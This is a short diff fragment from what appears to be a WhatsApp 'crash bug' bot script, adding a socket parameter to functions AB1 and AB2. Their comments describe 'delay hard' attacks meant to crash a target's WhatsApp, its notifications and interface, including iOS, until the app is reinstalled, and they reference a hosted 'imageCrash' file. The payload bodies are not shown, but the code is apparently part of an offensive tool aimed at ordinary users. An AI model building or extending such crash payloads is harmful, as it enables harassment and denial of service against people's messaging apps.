@@ -517,7 +517,7 @@ async function F(sock, target) {
 
 // HIS FUNCTION
 // Invisible Version - Delay Hard
-async function AB1(target, mention) {
+async function AB1(sock, target, mention) {
 
   const imageCrash = "https://files.catbox.moe/ykvioj.jpg";
 
@@ -663,7 +663,7 @@ async function AB1(target, mention) {
 
 
 // No Invisible Version - Super Delay Hard Permanen ( if not reinstall wa, terror notif, crash notif, crash ui, crash ios )
-async function AB2(target, mention) {
+async function AB2(sock, target, mention) {
   const imageCrash = "https://files.catbox.moe/ykvioj.jpg";
 
   const mentionedMetaAi = [
